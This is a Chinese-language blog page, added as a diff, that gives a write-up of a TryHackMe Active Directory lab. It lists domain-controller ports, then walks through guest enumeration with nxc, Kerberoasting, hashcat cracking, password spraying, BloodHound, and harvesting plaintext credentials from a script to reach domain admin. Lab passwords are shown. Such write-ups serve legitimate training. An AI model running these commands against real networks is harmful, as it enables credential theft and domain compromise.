@@ -1,0 +1,1216 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+>
+
+<title>THM OPERATION ENDGAME | SYC</title>
+
+<meta
+    name="description"
+    content="本次挑战将着重于利用 Active Directory 环境。 🔑 需要关注的核心端口 一个 Active Directory 域控制器会开放一系列特定服务。你可以把这张表作为你的&quot;作战地图&quot;： 端口 (TCP) 服务名称 作用与潜在攻击面 53 DNS 域名解析服务。Kerberos 协议强依赖 DNS，配置错误或区域传输漏洞可能导致信..."
+>
+
+<meta
+    name="robots"
+    content="index, follow"
+>
+
+<link
+    rel="canonical"
+    href="https://syc-sigma.vercel.app/p/THM%20operation%20endgame"
+>
+
+<meta
+    property="og:title"
+    content="THM OPERATION ENDGAME | SYC"
+>
+
+<meta
+    property="og:description"
+    content="本次挑战将着重于利用 Active Directory 环境。 🔑 需要关注的核心端口 一个 Active Directory 域控制器会开放一系列特定服务。你可以把这张表作为你的&quot;作战地图&quot;： 端口 (TCP) 服务名称 作用与潜在攻击面 53 DNS 域名解析服务。Kerberos 协议强依赖 DNS，配置错误或区域传输漏洞可能导致信..."
+>
+
+<meta
+    property="og:type"
+    content="article"
+>
+
+<meta
+    property="og:url"
+    content="https://syc-sigma.vercel.app/p/THM%20operation%20endgame"
+>
+
+<meta
+    property="og:site_name"
+    content="SYC"
+>
+
+<meta
+    name="twitter:card"
+    content="summary"
+>
+
+<meta
+    name="twitter:title"
+    content="THM OPERATION ENDGAME | SYC"
+>
+
+<meta
+    name="twitter:description"
+    content="本次挑战将着重于利用 Active Directory 环境。 🔑 需要关注的核心端口 一个 Active Directory 域控制器会开放一系列特定服务。你可以把这张表作为你的&quot;作战地图&quot;： 端口 (TCP) 服务名称 作用与潜在攻击面 53 DNS 域名解析服务。Kerberos 协议强依赖 DNS，配置错误或区域传输漏洞可能导致信..."
+>
+
+<link rel="icon" type="image/png" href="/favicon.png">
+
+<link
+    rel="shortcut icon"
+    href="/favicon.ico"
+    type="image/x-icon"
+>
+
+<link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=Fira+Code&display=swap"
+    rel="stylesheet"
+>
+
+<link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+    id="hljs-style"
+>
+
+<script
+    src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"
+    defer
+></script>
+
+
+<style>
+
+:root[data-theme="dark"] {
+    --bg-1: #050505;
+    --bg-2: #0a0c1a;
+    --bg-3: #120d1a;
+    --text-main: #ffffff;
+    --text-dim: rgba(255, 255, 255, 0.5);
+    --accent: #ffffff;
+    --canvas-opacity: 0.9;
+    --code-bg: rgba(0, 0, 0, 0.5);
+}
+
+:root[data-theme="light"] {
+    --bg-1: #fdfdfd;
+    --bg-2: #f0f4ff;
+    --bg-3: #f9f0ff;
+    --text-main: #000000;
+    --text-dim: rgba(0, 0, 0, 0.5);
+    --accent: #000000;
+    --canvas-opacity: 0.5;
+    --code-bg: rgba(0, 0, 0, 0.05);
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    transition:
+        background-color 0.6s,
+        color 0.4s;
+}
+
+html {
+    scroll-behavior: smooth;
+}
+
+body {
+    background:
+        linear-gradient(
+            125deg,
+            var(--bg-1),
+            var(--bg-2),
+            var(--bg-3),
+            var(--bg-1)
+        );
+
+    background-size: 400% 400%;
+
+    animation:
+        spaceFlow 25s ease infinite;
+
+    color: var(--text-main);
+
+    font-family:
+        'Inter',
+        -apple-system,
+        BlinkMacSystemFont,
+        sans-serif;
+
+    line-height: 1.8;
+
+    overflow-x: hidden;
+}
+
+@keyframes spaceFlow {
+    0% {
+        background-position: 0% 50%;
+    }
+
+    50% {
+        background-position: 100% 50%;
+    }
+
+    100% {
+        background-position: 0% 50%;
+    }
+}
+
+#article-canvas {
+    position: fixed;
+    top: 0;
+    left: 0;
+
+    width: 100%;
+    height: 100%;
+
+    z-index: -1;
+
+    pointer-events: none;
+
+    opacity: var(--canvas-opacity);
+}
+
+.theme-toggle {
+    position: fixed;
+
+    bottom: 30px;
+    right: 30px;
+
+    width: 48px;
+    height: 48px;
+
+    border-radius: 50%;
+
+    background: var(--text-main);
+    color: var(--bg-1);
+
+    border: none;
+
+    cursor: pointer;
+
+    z-index: 2000;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    font-family: 'Fira Code';
+
+    font-size: 10px;
+
+    font-weight: bold;
+
+    box-shadow:
+        0 10px 30px rgba(0,0,0,0.2);
+}
+
+#progress {
+    position: fixed;
+
+    top: 0;
+    left: 0;
+
+    height: 3px;
+
+    background: var(--accent);
+
+    width: 0%;
+
+    z-index: 2000;
+}
+
+nav {
+    padding: 25px 40px;
+
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+
+    position: sticky;
+
+    top: 0;
+
+    z-index: 1000;
+
+    display: flex;
+
+    justify-content: space-between;
+
+    align-items: center;
+}
+
+nav a {
+    color: var(--text-dim);
+
+    text-decoration: none;
+
+    font-size: 11px;
+
+    font-family: 'Fira Code';
+
+    letter-spacing: 1px;
+}
+
+nav a:hover {
+    color: var(--text-main);
+}
+
+.content-wrapper {
+    max-width: 900px;
+
+    margin: 40px auto;
+
+    padding: 40px 24px;
+
+    min-height: 80vh;
+}
+
+.article-header {
+    margin-bottom: 70px;
+}
+
+.article-header h1 {
+    font-size:
+        clamp(32px, 7vw, 64px);
+
+    font-weight: 700;
+
+    color: var(--text-main);
+
+    letter-spacing: -4px;
+
+    line-height: 1;
+
+    text-transform: uppercase;
+}
+
+.article-meta {
+    margin-top: 20px;
+
+    color: var(--text-dim);
+
+    font-family: 'Fira Code';
+
+    font-size: 11px;
+
+    letter-spacing: 1px;
+}
+
+.markdown-body {
+    overflow-wrap: break-word;
+}
+
+.markdown-body img {
+    max-width: 100%;
+
+    height: auto;
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    display: block;
+
+    box-shadow:
+        0 20px 50px rgba(0,0,0,0.1);
+}
+
+.markdown-body h1 {
+    font-size: 38px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+}
+
+.markdown-body h2 {
+    font-size: 28px;
+
+    margin: 50px 0 20px;
+
+    color: var(--text-main);
+
+    border-bottom:
+        1px solid var(--text-dim);
+
+    padding-bottom: 8px;
+}
+
+.markdown-body h3 {
+    font-size: 22px;
+
+    margin: 40px 0 15px;
+
+    color: var(--text-main);
+}
+
+.markdown-body p {
+    margin-bottom: 25px;
+
+    font-size: 17px;
+
+    opacity: 0.85;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+    margin: 20px 0 25px;
+
+    padding-left: 30px;
+}
+
+.markdown-body li {
+    margin-bottom: 8px;
+}
+
+.markdown-body a {
+    color: var(--text-main);
+
+    text-decoration:
+        underline;
+
+    text-underline-offset: 4px;
+}
+
+.markdown-body blockquote {
+    margin: 25px 0;
+
+    padding: 15px 20px;
+
+    border-left:
+        3px solid var(--text-main);
+
+    color: var(--text-dim);
+}
+
+.markdown-body pre {
+    background:
+        var(--code-bg) !important;
+
+    padding: 25px;
+
+    border:
+        1px solid var(--text-dim);
+
+    border-radius: 12px;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+
+    backdrop-filter: blur(10px);
+}
+
+.markdown-body code {
+    font-family: 'Fira Code';
+
+    font-size: 14px;
+
+    background:
+        rgba(128,128,128,0.1);
+
+    padding: 3px 6px;
+
+    border-radius: 4px;
+}
+
+.markdown-body pre code {
+    background: transparent;
+
+    padding: 0;
+}
+
+.markdown-body table {
+    width: 100%;
+
+    border-collapse: collapse;
+
+    margin: 30px 0;
+
+    overflow-x: auto;
+}
+
+.markdown-body th,
+.markdown-body td {
+    border:
+        1px solid var(--text-dim);
+
+    padding: 10px;
+
+    text-align: left;
+}
+
+.markdown-body th {
+    color: var(--text-main);
+}
+
+@media (max-width: 768px) {
+
+    .content-wrapper {
+        padding: 20px;
+    }
+
+    nav {
+        padding: 15px 20px;
+    }
+
+    .article-header h1 {
+        letter-spacing: -2px;
+    }
+
+    .markdown-body p {
+        font-size: 16px;
+    }
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+<div id="progress"></div>
+
+<canvas id="article-canvas"></canvas>
+
+
+<button
+    class="theme-toggle"
+    onclick="toggleTheme()"
+>
+    MODE
+</button>
+
+
+<nav>
+
+<a href="/">
+    &lt;- BACK_TO_TERMINAL
+</a>
+
+<span
+    id="reading-id"
+    style="
+        font-family:'Fira Code';
+        font-size:10px;
+        color:var(--text-dim);
+    "
+>
+    SYSTEM: SYNCED
+</span>
+
+</nav>
+
+
+<main class="content-wrapper">
+
+<header class="article-header">
+
+<h1>
+THM OPERATION ENDGAME
+</h1>
+
+<div class="article-meta">
+    THM OPERATION ENDGAME.MD
+</div>
+
+</header>
+
+
+<article class="markdown-body">
+
+<p>本次挑战将着重于利用 Active Directory 环境。</p>
+<h3>🔑 需要关注的核心端口</h3>
+<p>一个 Active Directory 域控制器会开放一系列特定服务。你可以把这张表作为你的"作战地图"：</p>
+<table>
+<thead>
+<tr>
+<th>端口 (TCP)</th>
+<th>服务名称</th>
+<th>作用与潜在攻击面</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>53</strong></td>
+<td>DNS</td>
+<td>域名解析服务。Kerberos 协议强依赖 DNS，配置错误或区域传输漏洞可能导致信息泄露<a href="https://www.cnblogs.com/yumi0721/p/18835938"></a><a href="https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/"></a>。</td>
+</tr>
+<tr>
+<td><strong>88</strong></td>
+<td>Kerberos</td>
+<td>域的核心认证协议。可进行用户枚举、密码喷洒（Password Spraying），以及后续的<strong>Kerberoasting</strong>攻击<a href="https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/"></a><a href="https://www.freebuf.com/news/346768.html"></a>。</td>
+</tr>
+<tr>
+<td><strong>135</strong></td>
+<td>RPC</td>
+<td>远程过程调用。用于多种管理功能，常作为获取更多信息的跳板<a href="https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/"></a><a href="https://www.admin-magazine.com/index.php/Archive/2025/88/Search-for-domain-controller-vulnerabilities"></a>。</td>
+</tr>
+<tr>
+<td><strong>139/445</strong></td>
+<td>NetBIOS-SSN / SMB</td>
+<td>文件共享服务。可枚举用户、共享文件夹，如果签名未开启，还可能遭受<strong>NTLM中继攻击</strong><a href="https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/"></a><a href="https://x.threatbook.com/v5/article?threatInfoID=40868"></a>。</td>
+</tr>
+<tr>
+<td><strong>389/636</strong></td>
+<td>LDAP / LDAPS</td>
+<td>目录访问协议。可以查询域内几乎所有对象（用户、组、计算机），是<strong>信息收集的核心渠道</strong><a href="https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/"></a><a href="https://www.admin-magazine.com/index.php/Archive/2025/88/Search-for-domain-controller-vulnerabilities"></a>。</td>
+</tr>
+<tr>
+<td><strong>3268/3269</strong></td>
+<td>全局编录</td>
+<td>相当于LDAP的加速版，用于跨域查询，同样包含大量敏感信息<a href="https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/"></a><a href="https://www.admin-magazine.com/index.php/Archive/2025/88/Search-for-domain-controller-vulnerabilities"></a>。</td>
+</tr>
+<tr>
+<td><strong>464</strong></td>
+<td>kpasswd</td>
+<td>Kerberos密码修改服务<a href="https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/"></a><a href="https://www.freebuf.com/news/346768.html"></a>。</td>
+</tr>
+<tr>
+<td><strong>3389</strong></td>
+<td>RDP</td>
+<td>远程桌面。如果开放，可能存在弱口令或作为横向移动的落脚点<a href="https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/"></a><a href="https://xie.infoq.cn/article/d1720d3c85ec12f0bc62080ed"></a>。</td>
+</tr>
+<tr>
+<td><strong>5985/5986</strong></td>
+<td>WinRM</td>
+<td>Windows远程管理。常被用于 PowerShell 远程执行命令，是横向移动的常用通道。</td>
+</tr>
+<tr>
+<td><strong>9389</strong></td>
+<td>AD Web Services</td>
+<td>提供SOAP协议接口来查询AD。作为一种<strong>更隐蔽的LDAP替代方案</strong>，可用于信息收集以规避检测<a href="https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/?utm_source=newsletter.erreur403.fr&amp;utm_medium=referral&amp;utm_campaign=erreur-403-36"></a>。</td>
+</tr>
+</tbody>
+</table>
+<h3>🚀 一般流程</h3>
+<p>掌握端口后，通用的渗透流程如下：</p>
+<ol>
+<li>
+<p><strong>信息收集（Enumeration is key!）</strong></p>
+<ul>
+<li><strong>工具</strong>：<code>nmap</code> 是第一步，扫描上述所有端口。随后可以使用[[windows信息收集工具#enum4linux]]或[[windows信息收集工具#nxc]]，<code>ldapdomaindump 等工具，通过SMB或LDAP提取域内用户、组信息。</code>crackmapexec` 也是验证凭据和枚举共享的利器。</li>
+<li>nmap -T4 -n -sC -sV -Pn -p- 目标</li>
+</ul>
+</li>
+<li>
+<p><strong>获取初始访问（Getting Initial Foothold）</strong></p>
+<ul>
+<li>
+<p>根据开放的端口和服务选择突破口，常见手法包括：</p>
+<ul>
+<li>
+<p><strong>基于Kerberos</strong>：利用<code>Kerbrute</code>进行<strong>用户枚举</strong>，或对SPN账户进行<strong>Kerberoasting</strong>攻击<a href="https://tsecurity.de/de/2387411/IT+Programmierung/Exploiting+Active+Directory%3A+How+to+Abuse+Kerberos/"></a><a href="https://www.freebuf.com/news/346768.html"></a>。</p>
+</li>
+<li>
+<p><strong>基于SMB</strong>：查找可读的共享文件夹（如 <code>SYSVOL</code>、<code>Replication</code>），寻找泄露的配置文件（如包含 <strong>GPP密码</strong>的 <code>Groups.xml</code>）<a href="https://www.freebuf.com/news/346768.html"></a>。</p>
+</li>
+<li>
+<p><strong>基于Web/应用</strong>：如果开放了80或443端口，可能是一些与AD集成的应用（如Outlook Web App），可尝试密码喷洒<a href="https://www.cnblogs.com/yumi0721/p/18835938"></a>。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>横向移动与权限提升（Lateral Movement &amp; Privilege Escalation）</strong></p>
+<ul>
+<li>
+<p>拿到一个普通用户后，真正的挑战才刚刚开始。你的目标是域控。</p>
+<ul>
+<li>
+<p><strong>AD证书服务攻击 (AD CS)</strong>：如果环境配置了证书服务，可以使用<code>certipy</code><a href="https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/"></a> 寻找错误配置的证书模板（ESC1-ESC8），这可能直接让你变成域管理员<a href="https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/"></a>。</p>
+</li>
+<li>
+<p><strong>中继攻击</strong>：如果环境允许，可以利用<code>Responder</code>和<code>ntlmrelayx</code>结合IPv6或LLMNR欺骗，<strong>中继</strong>到其他机器<a href="https://x.threatbook.com/v5/article?threatInfoID=40868"></a>。</p>
+</li>
+<li>
+<p><strong>票据攻击</strong>：使用<code>mimikatz</code>、<code>Rubeus</code>或Impacket套件<a href="https://www.freebuf.com/news/346768.html"></a><a href="https://www.tevora.com/threat-blog/petitpotam-the-full-attack-chain-with-windows-and-linux/"></a> 进行<strong>Pass-the-Ticket</strong>、<strong>白银票据</strong>或<strong>DCSync</strong>攻击，最终获取域控的哈希。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h3>💡 小提示</h3>
+<ul>
+<li>
+<p><strong>DNS至关重要</strong>：很多攻击（特别是Kerberos）依赖正确的DNS解析。记得将你的攻击机DNS指向域控IP，否则工具可能会无法正常工作<a href="https://www.cnblogs.com/yumi0721/p/18835938"></a>。</p>
+</li>
+<li>
+<p><strong>无凭据-&gt;有凭据-&gt;高权限</strong>：始终牢记这条主线。你的每一步操作都应该为下一步积累更多的信息或更高的权限。</p>
+</li>
+</ul>
+<h1>流程</h1>
+<p>nmap -T4 -n -sC -sV -Pn -p- 目标
+ ![[Pasted image 20260307133732.png]]
+从端口扫描中，我们可以看到Kerberos（88）、LDAP（389/636/3268/3269）、SMB（445）和DNS（53）等服务。<br />
+• 这些存在强烈表明目标是域控制器（DC）。<br />
+• 主机名被发现为 ，域名为 。<br />
+• 因此，我们需要在hosts文件中添加一个条目，以便系统能够正确解析域
+10.112.137.169 thm.local ad.thm.local
+然后使用[[windows信息收集工具#nxc]]
+扫描访客
+nxc smb thm.local -u 'guest' -p '' --shares
+┌──(root㉿kali)-[~/Desktop/THM]
+└─# nxc smb ad.thm.local -u 'guest' -p '' --shares
+SMB         10.49.147.124   445    AD               [<em>] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:False)
+SMB         10.49.147.124   445    AD               [+] thm.local\guest: 
+SMB         10.49.147.124   445    AD               [</em>] Enumerated shares
+SMB         10.49.147.124   445    AD               Share           Permissions     Remark
+SMB         10.49.147.124   445    AD               -----           -----------     ------
+SMB         10.49.147.124   445    AD               ADMIN$                          Remote Admin
+SMB         10.49.147.124   445    AD               C$                              Default share
+SMB         10.49.147.124   445    AD               IPC$            READ            Remote IPC
+SMB         10.49.147.124   445    AD               NETLOGON                        Logon server share 
+SMB         10.49.147.124   445    AD               SYSVOL                          Logon server share 
+然后使用检查Idap协议有什么可以用的
+┌──(root㉿kali)-[~/Desktop/THM]
+└─# nxc ldap 10.49.147.124 -u 'guest' -p ''
+LDAP        10.49.147.124   389    AD               [<em>] Windows 10 / Server 2019 Build 17763 (name:AD) (domain:thm.local)
+LDAP        10.49.147.124   389    AD               [+] thm.local\guest: 
+查找有SPN的用户
+┌──(root㉿kali)-[~/Desktop/THM]
+└─# nxc ldap 10.49.147.124 -u 'guest' -p '' --kerberoast kerberoast_hashes.txt
+LDAP        10.49.147.124   389    AD               [</em>] Windows 10 / Server 2019 Build 17763 (name:AD) (domain:thm.local)
+LDAP        10.49.147.124   389    AD               [+] thm.local\guest: 
+LDAP        10.49.147.124   389    AD               [<em>] Total of records returned 1
+LDAP        10.49.147.124   389    AD               [</em>] sAMAccountName: CODY_ROY, memberOf: CN=Remote Desktop Users,CN=Builtin,DC=thm,DC=local, pwdLastSet: 2024-05-10 22:06:07.611965, lastLogon: 2024-04-24 23:41:18.970113
+LDAP        10.49.147.124   389    AD               $krb5tgs$23$<em>CODY_ROY$THM.LOCAL$thm.local\CODY_ROY</em>$46838a94d20f6802fceb69a6c0b26f98$........</p>
+<p>这里可以看到有用户CODY_ROY而且memberOf: CN=Remote Desktop</p>
+<p>说明有远程桌面权限，所以我们破解他的Kerberos票据</p>
+<p>hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt --force</p>
+<p>或者用john</p>
+<p>john --format=krb5tgs kerberoast_hash.txt --</p>
+<p>wordlist=/usr/share/wordlists/rockyou.txt</p>
+<h2>hashcat</h2>
+<p>┌──(root㉿kali)-[~/Desktop/THM]
+└─# hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt --force
+hashcat (v7.1.2) starting
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.</p>
+<p>==================================================================================================================================================
+* Device #01: cpu-haswell-12th Gen Intel(R) Core(TM) i7-12650H, 1456/2912 MB (512 MB allocatable), 4MCU</p>
+<p>Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256</p>
+<p>Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1</p>
+<p>Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt</p>
+<p>ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.</p>
+<p>Watchdog: Temperature abort trigger set to 90c</p>
+<p>Host memory allocated for this attack: 513 MB (1349 MB free)</p>
+<p>Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec</p>
+<p>$krb5tgs$23$<em>CODY_ROY$THM.LOCAL$thm.local\CODY_ROY</em>$46838a94d20f6802fceb69a6c0b26f98$e1969fe8ea3720211c269d146ea5d092307a91055b9f9f2cf3191d310a0e4ffa.......</p>
+<p>Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$<em>CODY_ROY$THM.LOCAL$thm.local\CODY_ROY</em>...5c288a
+Time.Started.....: Sat Mar  7 13:56:33 2026, (0 secs)
+Time.Estimated...: Sat Mar  7 13:56:33 2026, (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  1523.6 kH/s (1.52ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 708608/14344385 (4.94%)
+Rejected.........: 0/708608 (0.00%)
+Restore.Point....: 704512/14344385 (4.91%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: SCORPIO5 -&gt; JENNER
+Hardware.Mon.#01.: Util: 26%</p>
+<p>Started: Sat Mar  7 13:56:11 2026
+Stopped: Sat Mar  7 13:56:35 2026</p>
+<h2>获取信息</h2>
+<p>这里我们获取了秘密为MKO)mko0
+然后通过这个获取信息</p>
+<p>获取用户信息</p>
+<p>nxc smb 10.49.147.124 -u 'CODY_ROY' -p 'MKO)mko0' --users</p>
+<p>看是什么组</p>
+<p>nxc smb 10.49.147.124 -u 'CODY_ROY' -p 'MKO)mko0' --local-groups</p>
+<p>这里我我们用这个账户远程连接到后发现文件权限受限尝试其他用户</p>
+<p>使用密码喷洒之前获取的用户名后，又找到一个同密码用户</p>
+<p>zachary_hunt</p>
+<p>nxc smb 10.49.147.124 -u 'zachary_hunt' -p 'MKO)mko0' --local-groups
+SMB         10.49.147.124   445    AD               [<em>] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:False) 
+SMB         10.49.147.124   445    AD               [+] thm.local\zachary_hunt:MKO)mko0 
+SMB         10.49.147.124   445    AD               [</em>] Enumerating with SAMRPC protocol
+SMB         10.49.147.124   445    AD               [+] Enumerated local groups</p>
+<p>这里<strong>重大发现！ZACHARY_HUNT是DnsAdmins组成员！</strong> 这是一个非常重要的权限，可以用来提权到SYSTEM甚至Domain Admin！</p>
+<p>这里使用BloodHound</p>
+<p>可以看到<strong>zachary_hunt</strong>用户拥有对<strong>jerri_lancaster</strong>用户的<strong>通用写作</strong>权限</p>
+<p>使用targetedKerberoast.py来请求kerberoast凭据</p>
+<p>再次使用hashcat获取密码</p>
+<p>lovinlife!</p>
+<p>然后用这个获取的再次尝试rdp连接</p>
+<p>这个账号就可以看文件夹的内容</p>
+<p>可以再C盘找到scripts文件夹，里面有syncer。ps1</p>
+<p>打开后内容为C:(Scripts&gt;type syncer.ps1
+ ImportActive Directory module
+Import-Module ActiveDirectory
+Define credentials
+$Username="SANFORD_DAUGHERTY"
+$Password=ConvertTo-SecureString"RESET_ASAP123" -AsPlainText-Force
+$Credential=New-ObjectSystem.Management.Automation.PSCredential($Username,$Password)
+Sync Active Directory
+Sync-ADobject -Object “DC-thm,DC-local" -Source "ad.thm.local" -Destination "ad2.thm.local" -Credential $Credential
+这里可以看到用户SANFORD_DAUGHERTY，密码为RESET_ASAP123
+同上我们再次检查权限
+nxc ldap 10.49.147.124 -u 'SANFORD_DAUGHERTY' -p 'RESET_ASAP123' -M get-desc-users 
+LDAP 10.49.147.124 389 AD [*] Windows 10 / Server 2019 Build 17763 (name:AD) (domain:thm.local) LDAP 10.49.147.124 389 AD [+] thm.local\SANFORD_DAUGHERTY:RESET_ASAP123 (Pwn3d!）</p>
+<p>pwded说明这是域控管理员，那就直接拿下</p>
+
+</article>
+
+</main>
+
+
+<script>
+
+/* ==========================================================
+   Theme
+   ========================================================== */
+
+function toggleTheme() {
+
+    const root =
+        document.documentElement;
+
+    const target =
+        root.getAttribute('data-theme') === 'dark'
+            ? 'light'
+            : 'dark';
+
+    root.setAttribute(
+        'data-theme',
+        target
+    );
+
+    localStorage.setItem(
+        'theme',
+        target
+    );
+
+    const style =
+        document.getElementById(
+            'hljs-style'
+        );
+
+    if (style) {
+
+        style.href =
+            target === 'dark'
+                ? "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css"
+                : "https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github.min.css";
+    }
+}
+
+
+/* ==========================================================
+   Restore Theme
+   ========================================================== */
+
+try {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            localStorage.getItem('theme') || 'dark'
+        );
+
+} catch (e) {
+
+    document.documentElement
+        .setAttribute(
+            'data-theme',
+            'dark'
+        );
+}
+
+
+/* ==========================================================
+   Code Highlight
+   ========================================================== */
+
+window.addEventListener(
+    'load',
+    () => {
+
+        if (
+            window.hljs
+        ) {
+
+            document
+                .querySelectorAll(
+                    'pre code'
+                )
+                .forEach(
+                    (el) => {
+                        hljs.highlightElement(el);
+                    }
+                );
+        }
+
+    }
+);
+
+
+/* ==========================================================
+   Reading ID
+   ========================================================== */
+
+document
+    .getElementById('reading-id')
+    .innerText =
+        'SYSTEM: THM OPERATION ENDGAME.MD';
+
+
+/* ==========================================================
+   Reading Progress
+   ========================================================== */
+
+window.addEventListener(
+    'scroll',
+    () => {
+
+        const winScroll =
+            document.documentElement.scrollTop;
+
+        const height =
+            document.documentElement.scrollHeight -
+            document.documentElement.clientHeight;
+
+        const percentage =
+            height > 0
+                ? (winScroll / height) * 100
+                : 0;
+
+        document
+            .getElementById('progress')
+            .style.width =
+                percentage + '%';
+
+    }
+);
+
+
+/* ==========================================================
+   Dynamic Background
+   ========================================================== */
+
+const canvas =
+    document.getElementById(
+        'article-canvas'
+    );
+
+const ctx =
+    canvas.getContext('2d');
+
+let fluidNodes = [];
+
+let trailParticles = [];
+
+const mouse = {
+    x: -500,
+    y: -500
+};
+
+
+function initCanvas() {
+
+    canvas.width =
+        window.innerWidth;
+
+    canvas.height =
+        window.innerHeight;
+
+    fluidNodes =
+        Array.from(
+            { length: 3 },
+            () => ({
+
+                x:
+                    Math.random() *
+                    canvas.width,
+
+                y:
+                    Math.random() *
+                    canvas.height,
+
+                vx:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                vy:
+                    (Math.random() - 0.5) *
+                    0.4,
+
+                size:
+                    Math.random() *
+                    (canvas.width * 0.4) +
+                    canvas.width * 0.3
+            })
+        );
+}
+
+
+window.onmousemove =
+    (e) => {
+
+        mouse.x =
+            e.clientX;
+
+        mouse.y =
+            e.clientY;
+
+        for (
+            let i = 0;
+            i < 2;
+            i++
+        ) {
+
+            trailParticles.push(
+                new Particle(
+                    mouse.x,
+                    mouse.y
+                )
+            );
+        }
+    };
+
+
+class Particle {
+
+    constructor(x, y) {
+
+        this.x = x;
+
+        this.y = y;
+
+        this.vx =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.vy =
+            (Math.random() - 0.5) *
+            1.5;
+
+        this.life = 1.0;
+
+        this.decay =
+            0.015 +
+            Math.random() * 0.02;
+
+        this.size =
+            Math.random() * 2.5 +
+            0.5;
+    }
+
+    update() {
+
+        this.x += this.vx;
+
+        this.y += this.vy;
+
+        this.life -= this.decay;
+    }
+
+    draw(color) {
+
+        ctx.fillStyle =
+            `rgba(${color}, ${this.life * 0.4})`;
+
+        ctx.beginPath();
+
+        ctx.arc(
+            this.x,
+            this.y,
+            this.size,
+            0,
+            Math.PI * 2
+        );
+
+        ctx.fill();
+    }
+}
+
+
+function draw() {
+
+    const isDark =
+        document.documentElement
+            .getAttribute(
+                'data-theme'
+            ) === 'dark';
+
+    ctx.fillStyle =
+        isDark
+            ? "rgba(5, 5, 5, 0.15)"
+            : "rgba(253, 253, 253, 0.15)";
+
+    ctx.fillRect(
+        0,
+        0,
+        canvas.width,
+        canvas.height
+    );
+
+    ctx.globalCompositeOperation =
+        isDark
+            ? "lighter"
+            : "multiply";
+
+
+    const colorRGB =
+        isDark
+            ? "60, 70, 100"
+            : "200, 210, 240";
+
+
+    fluidNodes.forEach(
+        node => {
+
+            node.x += node.vx;
+
+            node.y += node.vy;
+
+
+            if (
+                node.x < 0 ||
+                node.x > canvas.width
+            ) {
+                node.vx *= -1;
+            }
+
+
+            if (
+                node.y < 0 ||
+                node.y > canvas.height
+            ) {
+                node.vy *= -1;
+            }
+
+
+            const g =
+                ctx.createRadialGradient(
+                    node.x,
+                    node.y,
+                    0,
+                    node.x,
+                    node.y,
+                    node.size
+                );
+
+
+            g.addColorStop(
+                0,
